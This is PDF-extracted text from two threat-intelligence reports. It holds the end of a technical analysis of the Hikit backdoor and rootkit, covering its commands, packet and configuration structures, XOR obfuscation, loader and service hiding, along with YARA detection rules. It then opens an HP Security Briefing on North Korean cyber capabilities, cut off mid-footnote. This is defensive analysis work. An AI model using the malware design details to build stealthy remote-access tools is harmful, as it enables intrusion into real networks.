command , an attacker can instruct the externally exposed Gen 1 DLL to route traffic to a Gen 1 DLL
that is behind the firewall , effectively making the externally exposed Gen 1 DLL a local router for Hikit
traffic .
Command :   proxy ( Gen 1.2 and later ) , socks5   ( Gen 1.0 and 1.1 )
The
proxy
( or
socks5 ) command allows an attacker to utilize a Hikit - infected machine as a proxy .
Command :   information
Gen 2 samples rely on a configuration in order to know where the C2 server exists along with other
operational aspects such as the name of its service and operational times . This information is important
for the attacker to have access to in order to determine if any aspect of the configuration is out of date
( thus requiring a new variant of the Gen 2 binary to be configured and deployed ) . The
information

command returns to the attacker the complete configuration and current state of the Gen 2 malware .
Command :   exit
As the name implies , the
exit
command causes the DLL to discontinue the current connection .


Hikit Core Analysis
With the Gen 1 sub - family using a server model and the Gen 2 sub - family using the client model ,
understanding how each of the DLL components of the sub - families works is best done , as with the
Driver above , in the context of the specific sub - family .
Gen 1 Analysis
As noted previously in this report , the Gen 1 sub - family has several sub - generations but overall the
functionality of the Gen 1 sub - family has remained constant . With the exception of Gen 1.0 , the
functionality of Gen 1 comes from the DLL component ( Gen 1.0 uses a stand - alone executable to
achieve the same results ) . The DLL operates as a service , requiring an attacker is install the DLL as a
service at some point prior to activation . The DLL contains only two exports : DllEntryPoint
and

DllRegisterServer .
Ultimately , both exports generate a new thread of the same function
( “ mainThread ” ) . The difference between the two exports is that DllRegisterServer
can take an
optional command line argument of the letter “ u ” which will instruct the main thread to uninstall the Gen
1 system from a victim ’s computer . If the uninstall argument exists ,
mainThread
will simply remove the
Driver from the victim ’s machine and terminate . The authors of Gen 1 used freely available source code
found online for their removal function.4





























































4

PCAUSA .
“ Programmatically
Installing
NDIS
Protocol
Drivers ”
http://www.ndis.com / ndis-­‐
general / ndisinstall / programinstall.htm .
2
December
2013 .






When the DLL activates , either by a call to
DllEntryPoint
or by calling
DllRegisterServer

without the u parameter ,
mainThread
begins by verifying the version of the Driver installed on the
victim ’s machine . This requires sending OID 0x12C850 to the Driver and comparing the resulting 32-bit
value with the required driver version . If the version is incorrect ( i.e. it does n’t match the specified
version ) , the DLL installs the version of the Driver found within the DLL ’s resource section ( under the

BIN
resource tree ) .


With the Driver version verified ( or forcibly corrected by installing the appropriate Driver ) , the DLL will
instruct the Driver to use a specified string ( for Gen 1.0 and Gen 1.1 samples ) or a DWORD ( for Gen
1.2 samples ) as the acknowledgment value to send to a connecting client who requests the appropriate
URL . The DLL again checks the version of the Driver and , in some versions of the DLL , will print a
message indicating the version of the Driver installed and report the “ Transate version ” ( the word
translate is misspelled within the binary ) . It appears that the Driver and the communication protocol
version do not necessarily have to match exactly , allowing the possibility that the Driver and the DLL
could be compiled at separate times . If the Driver version is less than the “ Transate ” version ( indicating
that the Driver is a version too old to support the necessary communication protocols ) , the DLL will , in
some version of the DLL , print out a line to the screen indicating the DRIVER_MIN_VERSION
required
along with the current Driver version . Following this , the DLL will then attempt to install the correct
version of the Driver prior to terminating . It is unclear why this code exists given that the DLL will check
the Driver version and correct the Driver if necessary prior to reaching the portion of the code that
reports the
DRIVER_MIN_VERSION .
It is possible that the second Driver version check is a last ditch
effort to ensure the correct Driver is installed .
The DLL enters an infinite loop where the DLL waits for the Driver to report a new channel exists . A
channel represents an established connection between the Driver and an external party that has
provided the proper initial request and , for Gen 1.2 variants , provided the proper authentication value .
When the Driver establishes a new channel , the DLL generates a runtime data structure before
generating a new thread ( “ HikitThreadFunc ” ) which will service any request coming from the new
channel . This allows the DLL to service multiple channels at one time .
The HikitThreadFunc
function is , at its core , a simple wait and respond loop . The function begins by
transmitting a Hikit command prompt to the client ( Hikit > ) before settling into an infinite loop of

•    Read data from channel ( wait until data is available )
•    [ For Gen 1.2 ] Decrypt the packet header
•    Verify the packet header to ensure the communication version is correct and the payload data
size is non - zero
•    Read the remainder of the packet ( e.g. the payload portion )
•    If the packet type field ( dwPacketType ) is zero , send the payload section to the command
processor .
•    Send the Hikit prompt
The communication scheme between the DLL and the client consists of a 20 to 24 byte header ( for Gen
1.0 and Gen 1.1 ) or a 28 byte header ( for Gen 1.2 ) followed by an optional payload . The format of the
Gen 1.0 and Gen 1.1 header is as follows :




struct PacketHeader
{
char magic[5 ] ;
char zeros[3 ] ;
DWORD dwHikitVersion ;
DWORD dwCmdType ;
DWORD dwLocale ;      // omitted in some Gen 1.0 variants
DWORD dwPayloadSize ;
} ;
While the Gen 1.2 header is :
struct PacketHeader
{
DWORD key ;
DWORD dwHikitVersion ;
DWORD dwPacketType ;
DWORD dwLocale ;
DWORD dwCodePage ;
DWORD dwPayloadSize ;
} ;


For Gen 1.0 and Gen 1.1 samples , the magic field contains the string “ .. .. ”
( two dots followed by a
space then two more dots ) . Whereas the key field in Gen 1.2 samples contains a 32-bit value that
represents the XOR key for the remainder of the PacketHeader and any additional payload data . The
XOR scheme works on 32-bit chunks of data where each 32-bit chunk of data is XOR’d against the key
value .
Version checking is important in all Gen 1 variants . The dwHikitVersion
field allows the client and
the DLL to ensure that they have a compatible communication scheme in place prior to executing
commands .
Gen 1 samples have a particular interest in the victim ’s locale language preferences . While it is typical
for most RATs that provide remote shells to simply pass data unfiltered from client to server and server
to client without regard to code pages , Gen 1 samples take special care to record the code page and
locale information in each and every packet header that traverses the divide between client and server
and server and client . This could indicate that the authors of Gen 1 understood from an early stage in
the development of Gen 1 that they would be attacking computer systems with different locales and
code pages .
Gen 2 Analysis
The Gen 2 sub - family , like Gen 1.2 , uses a DLL for the core of its RAT functionality . In order for the
DLL to load , Gen 2 ( starting with Gen 2.1 ) uses a loader application ( referred to simply as “ the
Loader ” ) . The Loader comes in the form of a standard executable image or a DLL image . Despite the
different models , both variants of the Loader load the embedded DLL in the exact same way . The only
difference between the executable and DLL versions of the Loader comes in how they handle the
initialization of the embedded DLL .








Figure 1 : DLL ( left ) and executable ( right ) Loader startup routines
Figure 1 provides a side by side comparison of the startup routines for the executable and DLL
Loaders . Both versions of the Loader begin by loading the embedded DLL from the Loader ’s resources
( item 102 under the Group Icons resource tree ) , decrypting and decompressing the image into memory ,
then manually loading the DLL into memory using a custom loading routine . The function

LoadEmbeddedImage , as seen in part in Figure 2 , is responsible for this operation .








Figure 2 : LoadEmbeddedImage function snippet
The Loader obfuscates many strings by using a simple XOR encoding scheme . Decryption of encoded
strings consists of taking the first value of the string as the XOR key , XOR’ing all subsequent bytes until
the result of the XOR returns 0 . The decoding of the encoded strings is handled by the DecodeString
function .
The Loader stores the embedded DLL within a Group Icon resource within a legitimate icon image . In
order to locate the embedded DLL ,
LoadEmbeddedImage
will use the
DecodeString
function to
decrypt the delimiter string ( which is typically
zzzzzzzzzz
or
yyyyyyyyyy ) and then search the icon ’s
resource memory for the delimiter string . Once located ,
LoadEmbeddedImage
will use the first 12
bytes immediately after the string as the information structure about the embedded DLL . The structure
( seen below ) defines the size of the embedded DLL within the icon ’s resource memory , the size of the




DLL after it is decompressed and a 4-byte XOR key that
LoadEmbeddedImage
must use to decode
the embedded DLL prior to decompression .
struct ImageHeader
{
DWORD dwImageEncodedSize ;
DWORD dwImageSizeDecompressed ;
DWORD EncodingKey ;
} ;
LoadEmbeddedImage
copies the compressed embedded DLL into a newly allocated heap buffer and
then calls the function
decodeBuffer
( using the
EncodingKey
value ) to decrypt the embedded DLL .
Another heap buffer is allocated with a size equal to the value of
dwImageSizeDecompressed .
The
decompression buffer along with the now decoded compressed buffer are given to lzo_decompress

which decompresses the compressed image using the LZO1X algorithm5 .
With the embedded DLL now decompressed into a heap buffer , LoadEmbeddedImage
calls

ImageLoaderData::LoadDll
to manually load the DLL into memory .
ImageLoaderData::LoadDll
interprets the PE / COFF header of the DLL image , loads the image
into the appropriate memory configuration , performs the necessary relocation operations , and calls the

DllMain
( DLL ’s entry point ) function .
After loading the embedded DLL image into memory , the Loader will either call the DLL ’s

StartServer
or
MatrixMain
function depending on the type of Loader . The standalone Loaders use
the
MatrixMain
function while the DLL Loaders will call the
StartServer
function . The Loaders ,
upon unloading , will call the StopServer function in order to shut down the embedded DLL .
The Gen 2 DLL exposes five exported functions ( besides the
DllEntryPoint / DllMain ) .
Export Name                                                                                                                                                                Description
DllRegisterServer                                                                                                                                                          If the Gen 2 RAT is running , waits for the RAT to shut down before returning .
MatrixMain                                                                                                                                                                 Activates the Gen 2 RAT ( called from a stand - alone Loader )
SetModuleHandle                                                                                                                                                            The given parameter becomes the new module handle for the RAT .
StartServer                                                                                                                                                                Activates the Gen 2 RAT ( called from a DLL Loader )
StopServer                                                                                                                                                                 Stops the Gen 2 RAT ( called from a DLL Loader )
MatrixMain
and
StartServer
both ultimately generate a new thread ( using the POSIX API function

beginthreadex
instead of the more common
CreateThread ) that contains the main loop of the Gen
2 RAT functionality . MatrixMain , however , has added functionality . The prototype for MatrixMain is as
follows :
int MatrixMain(HINSTANCE hInstance , HINSTANCE hPrevInstance , LPWSTR
lpCmdLine , int nShowCmd ) )





























































5

Markus
F.X.J.
Oberhumer ,
“ LZO
real-­‐time
data
compression
library ”
http://www.oberhumer.com / opensource / lzo/.
29

June
2014 .





where Arguments parameter can be :
Arguments string                                  Purpose
test { DWORD identifier ( IP ? ) }                     Overrides the current configuration with the given
{ listening Port } [ C2 address ] [ C2 port ]           settings . The C2 arguments are optional .
i                                                 Installs trojan service
u                                                 Uninstalls the trojan service
s                                                 Sets the SHOW flag for the service to instruct the
Driver to reveal the service .
h                                                 Sets the HIDE flag for the service to instruct the
Driver to hide the service .
q                                                 Sets the STOP flag for the RAT .


If the i
parameter is given , the DLL will install itself as a service on the victim ’s machine . The DLL will
create a new service ( e.g. “ Network DDE Service ” ) and assign itself as the executable for the service .
The DLL ’s RAT functionality provides basic features such as network port forwarding ( proxying ) , file
transfer , and remote command shell . The RAT functionality provides an attacker with the ability to
establish a phantom network within a victim ’s infrastructure by having individual instances of Gen 2 DLL
listen for incoming connections on local ports ( presumably , NAT’d ports ) and accept commands from
the inbound connection . This allows an attacker to establish several Gen2 infections within a victim ’s
infrastructure and if outbound connectivity is prohibited for any of the infected machines , the attacker
can route commands to the pseudo - isolated infections through accessible infected machines providing
a high level of persistence to the malware . Each Gen 2 infection can support up to 10 listening ports .
The communication between the Gen 2 malware and the C2 ( or other Gen 2 malware , in the case of
the internal routing functionality ) is encrypted using a simple DWORD XOR scheme . Each
communication burst ( either between the malware and the C2 or the malware and neighboring
malware ) begins with a 24-byte header identical to the header found in Gen 1.2 . Immediately following
the header is the type - specific ( as indicated by the
dwPayloadType field ) payload data . Note that the

dwXORKey
value is NOT encoded with the XOR value , but rather is the value that is used for encoding
the header and payload .
Each DLL includes a hardcoded , default configuration . At the time that the RAT functionality activates ,
the DLL will drop the current configuration to disk . If the configuration file already exists , then the RAT
will use the file version of the configuration over the default configuration . The configuration data
structure ( seen below ) doubles as a current state record for some aspects of the communication
subsystem of the DLL . When stored on disk , the configuration is preceded by a GUID value ( 16 bytes )
that represents the unique identifier for the specific infection . The configuration is XOR encoded using
the first 4 bytes ( as a DWORD ) of the GUID .




struct Config
{
WCHAR wszComment[32 ] ;
C2ConfigInfo arrC2s[2 ] ;
ListeningPortConfig ListeningPorts[10 ] ;
int dwStartTime ;
int dwEndTime ;
_ _ int16 Flags ;
SYSTEMTIME sleepUntil ;
_ _ int16 unused_align2_2 ;
int fRunHidden ;
} ;
struct C2ConfigInfo
{
WCHAR wszAddress[32 ] ;
_ _ int16 wPort ;
_ _ int16 unused_align2 ;
int fValidC2 ;
} ;
struct ListeningPortConfig
{
unsigned _ _ int16 wPort ;
unsigned _ _ int16 unused_align2 ;
int fReady ;
SOCKET hSocket ;
HANDLE hEvent ;
HANDLE hListenerThread ;
} ;


In order to provide some level of stealth , the RAT will install a rootkit on 32-bit versions of Windows .
The DLL contains a device driver image embedded within an encoded buffer which the RAT
functionality code will extract to the % TEMP%
directory ( after XOR’ing the buffer with 0x76 ) . To activate
the rootkit , the RAT functionality code creates a service with the driver in the % TEMP%
directory as the
executable for the service . The RAT functionality code then activates the service and opens a handle to
device driver ’s interface ( e.g. \Globals\HTTPS ) . With the handle open to the rootkit driver , the RAT
functionality code deletes the service in order to reduce the visible footprint of the new driver . To further
reduce the footprint of the driver , the RAT functionality code also uses the cloaking functionality of the
rootkit to hide the DLL ’s PID , any references to the GUID { 4AE26357 - 79A3 - 466D - A6D9-
FC38BFB67DEA } , the DLL ’s service names ( e.g. “ NetDDESrv ” and " Network DDE Service " ) and the
service entry as well . Additionally , the code also attempts to hide a service named “ Hitx ” .
Support Software
In addition to the main Hikit malware , there are at least two examples of support programs that belong
to the Hikit family . Samples b04de6c417b6f8836e3f2d8822be2e68f4f9722b and
7c4da9deff3e5c7611b9e1bd67d0e74aa7d2d0f6 are examples of Gen 1.0 and Gen 1.2 operator
consoles . The console is a text based application that takes a Gen 1.0 or Gen 1.2 infection ’s IP address
and proceeds to connect and authenticate with the infected server . Once connected , the operator has
the basic Hikit functionalities available to them via commands such as file and shell .




Detection
Detecting Hikit variants on disk and in memory is possible using the following YARA signature
developed by Symantec :
rule hikit
{
strings :
$ hikit_pdb1 = /(H|h)ikit_/
$ hikit_pdb2 = " hikit\\ "
$ hikit_str3 = " hikit > " wide
$ driver     =    " w7fw.sys " wide
$ device     =    " \\Device\\w7fw " wide
$ global     =    " Global\\%s__HIDE _ _ " wide nocase
$ backdr     =    " backdoor closed " wide
$ hidden     =    " * * * * * Hidden : " wide
condition :
( 1 of ( $ hikit_pdb1,$hikit_pdb2,$hikit_str3 ) ) and ( $ driver or
$ device or $ global or $ backdr or $ hidden )
}
rule hikit2
{
strings :
$ magic1 = { 8C 24 24 43 2B 2B 22 13 13 13 00 }
$ magic2 = { 8A 25 25 42 28 28 20 1C 1C 1C 15 15 15 0E 0E 0E 05 05 05
00 }
condition :
$ magic1 and $ magic2
}
rule hidkit
{
strings :
$ a = " ---HIDE "
$ b = " hide --- port = % d "
condition :
uint16(0)==0x5A4D and uint32(uint32(0x3c))==0x00004550 and $ a and $ b
}
Detecting nominal Gen 1.2 and later network activity is problematic given the nature of the
communication structure . The encrypted nature of the nominal Gen 1.2 and later network traffic makes
a signature difficult . Snort signature 30948 may detect some Hikit based network traffic for only Gen 1.0
and Gen 1.1 .




From a system objects perspective , Gen 2 samples produce up to three named events . The event
names change per infection , but have a common format . The following three strings represent the
known mutex strings for Gen 2 samples :
Global\%s__SHOW _ _
Global\%s__HIDE _ _
Global\%s__STOP _ _


where the % s format variable is replaced with a UUID value string specific to the infected machine .








Appendix A : HiKit Versions
Generation    Starting Date       Notable Features
Identifier
Gen 1.0       31 March 2011       First known Hikit samples . Stand - alone console executable .
Gen 1.1       18 April 2011       Uses DLL and driver model .
Gen 2.0       28 August 2011      First client - based Hikit variants . Stand - alone console
Alpha                            executable . Does not use a device driver . Encrypted
communication .
Gen 1.2       23 October 2011     Command “ socks5 ” changes to “ proxy ” . Encrypted
communication .
Gen 2.0       27 February 2012    Introduces the use of the device driver .
Beta
Gen 2.1       17 April , 2012      First known production variant of the Gen 2 family . Uses the
concept of the Loader , the DLL and the Driver as a complete
system .
Gen 2.2       21 February 2013    Changes storage location for configuration file . Largely similar
to Gen 2.1 . DLL - based and executable - based loaders . Largest
in - service time span .
Gen 2.3       12 December         Significantly more advanced authentication when doing intra-
2013                malware communication . Use of SSL certificate during
handshake .



Companion report
HP Security Briefing
Episode 16 , August 2014
Profiling an enigma : The
mystery of North Korea ’s cyber
threat landscape
HP Security Research
Table of Contents
Introduction .................................................................................................................................................... 3
Research roadblocks ...................................................................................................................................... 4
Ideological and political context .................................................................................................................... 5
Juche and Songun ...................................................................................................................................... 5
Tension and change on the Korean Peninsula .......................................................................................... 8
North Korean cyber capabilities and limitations ......................................................................................... 10
North Korean infrastructure .................................................................................................................... 10
An analysis of developments in North Korean cyberspace since 2010 .................................................. 14
North Korean cyber war and intelligence structure ................................................................................ 21
North Korean cyber and intelligence organizational chart ..................................................................... 26
North Korea ’s cyber doctrine , strategies and goals ............................................................................... 26
Cyber warfare operations ........................................................................................................................ 27
Gaming for profit and pwnage ................................................................................................................ 29
Intelligence and counterintelligence ...................................................................................................... 29
Psychological operations ........................................................................................................................ 32
Electronic warfare ................................................................................................................................... 38
Training cyber warriors ........................................................................................................................... 39
Important political and military ties ............................................................................................................ 42
China ........................................................................................................................................................ 42
© Copyright 2014 Hewlett - Packard Development Company , L.P. The information contained herein is subject to change without notice . The only warranties for HP
products and services are set forth in the express warranty statements accompanying such products and services . Nothing herein should be construed as constituting an
additional warranty . HP shall not be liable for technical or editorial errors or omissions contained herein .
Russia ...................................................................................................................................................... 43
Iran ........................................................................................................................................................... 43
Syria ......................................................................................................................................................... 44
Cuba ......................................................................................................................................................... 44
Timeline of significant North Korean cyber activity .................................................................................... 45
Patterns in the noise : cyber incidents attributed to North Korean actors .................................................. 47
DarkSeoul ................................................................................................................................................ 50
WhoIs Team ............................................................................................................................................. 52
IsOne ........................................................................................................................................................ 55
Kimsukyang ............................................................................................................................................. 57
New Romantic Cyber Army Team / Hastati ............................................................................................. 57
Malware summary ........................................................................................................................................ 58
Analysis ........................................................................................................................................................ 60
Summary ...................................................................................................................................................... 61
HP Security Research recommendations ..................................................................................................... 62
Appendix A – WHOIS records ........................................................................................................................ 64
Appendix B – Sites found on North Korean IP space .................................................................................... 72
Appendix C – Analysis of DarkSeoul Dropper .............................................................................................. 74
Learn more at .......................................................................................................................................... 75
Episode 16
Thank you for subscribing to Episode 16 of the HP Security Briefing . In this
edition we discuss the cyber landscape within the Democratic People ’s
Republic of Korea .
Introduction
The Democratic People ’s Republic of Korea ( DPRK ) , known in the West as North Korea , is a unique
country with a military - focused society and an unconventional technology infrastructure . While
North Korea was formerly on the U.S. list of state sponsors of terrorism , it was removed in 2008 . 1
However , due to North Korea ’s hostility toward other nations , its pursuit of nuclear weapons , and
human rights violations against its own citizens , the United Nations and many Western entities
have placed sanctions and embargoes against North Korea.2 3 For example , U.S. export laws
forbid the sale of dual - use technologies , or those that can be used or repurposed for both civilian
and military use , to North Korea.4 5 Additionally , the U.S. has a military alliance with the Republic of
Korea ( ROK ) , known in the West as South Korea , North Korea ’s primary target of conflict.6
Due to North Korea ’s global interactions , its cyber warfare capabilities are of particular interest to
the U.S. According to a 2009 report by Major Steve Sin , an intelligence analyst at U.S. Forces
Korea , North Korean hackers have successfully penetrated U.S. defense networks more
frequently than any other country that has targeted U.S. defense assets.7 While Major Sin may
have been overly optimistic about North Korea ’s abilities , it is clear that they should not be
underestimated . Frank Cilluffo , co - director of the Cyber Center for National and Economic Security
at George Washington University , testified before Congress that North Korea ’s cyber capability
" poses an important ' wild card ' threat , not only to the United States but also to the region and
broader international stability … "8 In an April 2014 testimony given to the House Armed Services
Committee , General Curtis M. Scaparrotti noted that “ North Korea remains a significant threat to
United States’ interests , the security of South Korea , and the international community due to its
willingness to use force , its continued development and proliferation of nuclear weapon and long-
range ballistic missile programs , and its abuse of its citizens’ human rights , as well as the
legitimate interests of its neighbors and the international community . ” Scaparrotti stressed that
“ While North Korea ’s massive conventional forces have been declining due to aging and lack of
resources … North Korea is emphasizing the development of its asymmetric capabilities . North
1
http://thecable.foreignpolicy.com/posts/2010/05/25/why_the_state_department_wont_put_north_korea_back_on_the_terror_list
2
http://www.sanctionswiki.org/North_Korea
3
https://www.fas.org/irp/offdocs/eo/eo-13551.pdf
4
http://www.foxnews.com/world/2012/04/17/un-computer-shipment-to-north-korean-regime-violates-us-manufacturers-ban/
5
http://www.state.gov/strategictrade/overview/
6
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
7
http://www.nextgov.com/defense/whats-brewin/2009/07/north-koreas-hackers-in-a-luxury-hotel/51330/
8
http://www.csmonitor.com/World/Security-Watch/2013/1019/In-cyberarms-race-North-Korea-emerging-as-a-power-not-a-pushover/(page)/3
Korea ’s asymmetric arsenal includes … an active cyber warfare capability.”9 While one would expect
the regime ’s digital infrastructure to also suffer from aging or lack of resources , these factors do
not take away from their technical abilities to wage cyber warfare .
While the U.S. views North Korea ’s cyber warfare program as the regime ’s foray into modern
asymmetrical warfare , South Korea views the regime ’s cyber capabilities as a terroristic threat , -a
build - up for an impending multifaceted attack . It is important to note that , to date , no such attack
has occurred . According to a report written by Captain Duk - Ki Kim , Republic of Korea Navy officer
and Ph.D. “ … the North Korean regime will first conduct a simultaneous and multifarious cyber
offensive on the Republic of Korea ’s society and basic infrastructure , government agencies , and
major military command centers while at the same time suppressing the ROK government and its
domestic allies and supporters with nuclear weapons.”10 South Korea ’s view of North Korea as a
terroristic threat may be an attempt to downgrade North Korea politically , since South Korea does
not recognize the regime as a legitimate state.11 South Korean reports also claim that North
Korea ’s premier hacking unit , Unit 121 , trails Russia and the U.S. as the world ’s third largest cyber
unit . 12 While this claim may be exaggerated , in 2012 , South Korean reports estimated North
Korea ’s hacker forces at around 3000 personnel . In a July 2014 report from South Korea ’s Yonhap
News Agency , that figure was upgraded to 5900 hacker elite.13 We must stress that although
these claims have not been corroborated , South Korea has taken the regime ’s cyber threats very
seriously and is reportedly training 5000 personnel to defend against North Korean cyber
attacks.14
Obtaining details on North Korea ’s cyber warfare capabilities is not an easy task . This paper will
examine the known cyber capabilities of North Korea ’s regime and how the country maintains
secrecy in these matters . Through information obtained via open source intelligence ( OSINT ) , we
will present what is known about North Korea ’s cyber warfare and supporting intelligence and
psychological operations capabilities .
Research roadblocks
The following conditions proved to be research roadblocks when gathering intelligence regarding
North Korea ’s cyber warfare capabilities :
 Much of the intelligence available on North Korea is dated and may not accurately reflect
the regime ’s current capabilities .
 Much of the intelligence available on North Korea comes from U.S. or South Korean
military or agency reports . These reports omit details that are likely classified , such as
specific IP addresses and individual actor information .
 While South Korea is an ally of the United States , its reports on North Korean cyber
activity potentially contain incomplete or biased information . Cultural factors that stem
9
http://docs.house.gov/meetings/AS/AS00/20140402/101985/HHRG-113-AS00-Wstate-ScaparrottiUSAC-20140402.pdf
10
https://www.usnwc.edu/getattachment/8e487165-a3ef-4ebc-83ce-0ddd7898e16a/The-Republic-of-Korea-s-Counter-asymmetric-Strateg
11
http://www.atimes.com/atimes/Korea/GA04Dg01.html
12
http://www.koreaherald.com/view.php?ud=20130321000980
13
http://www.theregister.co.uk/2014/07/07/north_korea_employs_6000_leet_hackers_source_claims/
14
http://www.theregister.co.uk/2014/07/07/north_korea_employs_6000_leet_hackers_source_claims/
from a history of tension and conflict between the two nations may skew perception and
make objectivity difficult . 15 16
      North Korea ’s Internet infrastructure and the regime ’s strict control over its use ensures
that there are no rogue actors and that all officially sanctioned actors exercise careful
OPSEC and PERSEC practices in order to prevent inadvertent information leaks . In other
words , there was no significant identifying information in the form of an OSINT trail left
behind by the actors . This hinders collection of original , actionable threat intelligence and
individual actor attribution .
      North Korea is well - isolated from the outside world , and its strong intelligence and
psychological operations presence effectively creates confusion via counterintelligence
and disinformation about the regime ’s capabilities.17 For this reason , any “ official ” reports
emanating from North Korea must be taken with a grain of salt . This also hinders
attempts to obtain original , actionable threat intelligence .
Ideological and political context
In order for Westerners to understand the North Korean mindset , it is necessary to examine the
key components of North Korean political and ideological thought . It is also necessary to provide a
brief explanation of how North Korea and South Korea view one another , in order to understand
the basis for conflict between the two .
Juche and Songun
North Korea has two primary ideologies that provide context for the regime ’s motivations and
activities : juche ( ju - cheh ) and songun ( sun - goon ) . Juche is the official political ideology of North
Korea . It was instituted in 1972 and is based on the ideologies of Kim Il - Sung , the founder of the
DPRK . Juche emphasizes self - reliance , mastering revolution and reconstruction in one ’s own
country , being independent of others , displaying one ’s strengths , defending oneself , and taking
responsibility for solving one ’s own problems . North Korea ’s air - gapped intranet , described below ,
exemplifies this philosophy in the country ’s cyber infrastructure . The juche philosophy explains
North Korea ’s disdain for outside cultural and political influence . Juche challenges North Koreans
to contribute to the regime ’s chaju ( ja - ju ) , a concept of national sovereignty and independence.18
The regime ’s greatest fear is internal dissent and resulting destabilization.19 20 In a June 2014
Reddit AMA session , Dr. Andrei Lankov , an expert on North Korean culture and society , noted
“ there are also serious signs of public alienation and discontent . And I can not rule out a public
outbreak of such discontent in the near future . Of course , if it happens , it will have a serious
impact on the government.”21 Despite North Korea ’s strong conviction in juche , the regime
collaborates with and receives support from other nations . However , due to this deep - seated
15
http://www.businessinsider.com/did-kim-jong-un-execute-his-ex-girlfriend-2013-8
16
http://www.telegraph.co.uk / news / worldnews / asia / northkorea/10554198/North - Koreas - invisible - phone - killer - dogs - and - other - such - stories-
why-the-world-is-transfixed.html
17
http://edition.cnn.com/2014/04/01/world/north-korea-provocation/index.html?iid=article_sidebar
18
http://www.stanford.edu/group/sjeaa/journal3/korea1.pdf
19
http://belfercenter.ksg.harvard.edu/publication/20269/keeping_kim.html
20
http://www.buzzfeed.com/miriamberger/the-world-as-viewed-by-north-koreas-propaganda-machine
21
http://www.reddit.com/r/NorthKoreaNews/comments/296ryd/i_am_dr_andrei_lankov_i_studied_in_north_korea/
ideology , it is doubtful that North Korea fully trusts these apparent allies.22 Later in this document ,
we will show that North Korea relies heavily on China for Internet access . North Korea also
collaborates with China and Russia to train its cyber warriors and has longstanding political and
military relationships with several nations .
Songun is North Korea ’s “ military first ” doctrine . Songun emphasizes the priority of the military in
resource allocation and political and economic affairs . 23 This doctrine stems from the belief that
the military is vital for preservation of chaju.24 Understanding songun mindset gives context for
this potential threat actor ’s motivations . According to a 2013 Congressional report , the strategy
established under former leader Kim Jong - Il focused on “ internal security , coercive diplomacy to
compel acceptance of its diplomatic , economic and security interests , development of strategic
military capabilities to deter external attack , and challenging South Korea and the
U.S .- South Korean alliance."25                                                             Songun is North Korea ’s
“ military first ” doctrine .
North Korea ’s songun permeates the lives of all North Korean citizens . Article 58 of                                            Songun emphasizes the
priority of the military in
the North Korean Constitution states that the nation should base itself on a                                                    resource allocation and
nationwide defense system that includes all people.26 North Korea , with a                                                       political and economic
population of 25 million , has an active duty force of 1.19 million personnel , the                                               affairs . Understanding this
fourth largest in the world . The country ’s reserve and paramilitary units comprise                                              mindset gives context for a
potential threat actor ’s
7.7 million additional personnel.27 In other words , over a third of the country ’s
motivations .
population serves in a military or paramilitary capacity .
Some North Korean youth aged 7 - 13 are inducted into the Korean Children ’s Union . The Korean
Children ’s Union is responsible for indoctrinating youths who pledge to build up their strength to
later defend the regime.28
22
http://www.defense.gov/pubs/ReporttoCongressonMilitaryandSecurityDevelopmentsInvolvingtheDPRK.pdf
23
http://www.strategicstudiesinstitute.army.mil/pdffiles/pub728.pdf
24
http://www.iar-gwu.org/sites/default/files/articlepdfs/DeRochie_-_The_Driving_Factor.pdf
25
http://www.defense.gov/news/newsarticle.aspx?id=119924
26
http://asiamatters.blogspot.co.uk/2009/10/north-korean-constitution-april-2009.html
27
http://edition.cnn.com/video/data/2.0/video/international/2014/04/29/north-korea-military-numbers.cnn.html
28
http://www.dailymail.co.uk / news / article-2307937/North - Korea - Haunting - images - indoctrination - ceremony - communist - cult - leaders - threatening-
nuclear-war-poisoning-generation.html?ITO=1490&ns_mchannel=rss&ns_campaign=1490
Figure 1 A group of North Korean children being inducted into the Korean Children ’s Union.29
Figure 2 Members of the Korean Children ’s Union with the regime ’s leader Kim Jong Un.30
29
http://www.dailymail.co.uk / news / article-2307937/North - Korea - Haunting - images - indoctrination - ceremony - communist - cult - leaders - threatening-
nuclear-war-poisoning-generation.html?ITO=1490&ns_mchannel=rss&ns_campaign=1490
Children aged 14 - 16 can begin military training as members of the Young Red Guards , a
paramilitary unit . Beginning at age 17 , North Koreans are eligible to join the Reserve Military
Training Unit.31 The Reserve Military Training Unit forms the core of North Korea ’s reserves and is
typically assigned to the front or regional defense in wartime.32 The youngest age at which a
citizen can be conscripted for active duty is unclear ; reported ages range from 18 - 20 . Youths can
volunteer for active duty service at age 16 or 17.33 The Worker - Peasant Militia , or Red Guards ,
includes males ages 17 - 60 and unmarried females ages 17 - 30 who are not part of active duty
units or the Reserve Military Training Unit.34
The regime has an impressive number of conventional weapons , considering the nation ’s small
land area and population size.35 According to statistics released by CNN in 2014 , North Korea ’s
ground arsenal includes 4100 tanks , 2100 armored vehicles , and 8500 pieces of field artillery .
The regime ’s sea weaponry includes 70 submarines , 420 patrol combatants , and 260 amphibious
landing craft . Their airpower includes 730 combat aircraft , 300 helicopters , and 290 transport
aircraft . While the limits of the regime ’s ballistic missile program are unknown , North Korea is
thought to have fewer than 100 short - range missiles and fewer than 100 medium to long - range
missiles.36 However , in recent years , North Korea has suffered oil,37 fuel,38 electricity,39 and food40
shortages . Without aid from another entity , the regime does not have sufficient resources to
maintain and sustain the majority of its weapons and associated personnel for rapid deployment
or prolonged combat .
Tension and change on the Korean Peninsula
Tension between North and South Korea has continued well past the armistice meant to end the
Korean War . Neither nation recognizes the other as a legitimate state . South Korea ’s constitution
legally defines South Korean territory as the entire Korean peninsula and its adjacent islands , with
“ North Korea ” being a part of South Korea . 41 North Korea also claims to be the sole government
of the Korean Peninsula.42 Each country ’s claim of sovereignty and refusal to acknowledge the
other as a legitimate state creates the condition for perpetual conflict . North Korea ’s negative
sentiment towards the U.S. stems from two major factors : the U.S. – South Korea military alliance
and North Korea ’s perception that the U.S. is imperialistic and prone to exploitative capitalism . 43
30
http://www.dailymail.co.uk / news / article-2307937/North - Korea - Haunting - images - indoctrination - ceremony - communist - cult - leaders - threatening-
nuclear-war-poisoning-generation.html?ITO=1490&ns_mchannel=rss&ns_campaign=1490
31
http://www.globalsecurity.org/military/world/dprk/army.htm
32
http://www.globalsecurity.org/military/world/dprk/army.htm
33
https://www.google.com / url?sa = t&rct = j&q=&esrc = s&source = web&cd=6&ved=0CFkQFjAF&url = http%3A%2F%2Fwww.child-
